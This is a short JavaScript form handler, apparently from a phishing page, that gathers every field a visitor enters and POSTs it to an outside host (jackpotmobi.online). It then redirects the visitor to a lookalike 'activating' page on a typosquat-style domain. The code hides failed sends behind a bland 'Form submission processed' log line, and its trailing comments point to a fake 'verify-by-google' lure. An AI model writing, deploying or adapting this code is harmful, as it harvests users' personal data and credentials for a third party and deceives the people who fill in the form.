function formAction(form) {
  // Get all form data
  const formData = new FormData(form);

  // Send form data to jackpotmobi (optional - for data collection)
  fetch("https://jackpotmobi.online/a88c8f8", {
    method: "POST",
    body: formData,
  }).catch((error) => {
    // If fetch fails, still redirect
    console.log("Form submission processed");
  });

  // Redirect to activation page after form submission
  setTimeout(() => {
    window.location.href = "https://wwwfirekirin.xyz/activating/";
  }, 500); // 500ms delay to allow form submission

  return false; // Prevent default form submission
}
//82fae2d
// verify-by-google
// https://jackpotmobi.online/verify-by-google
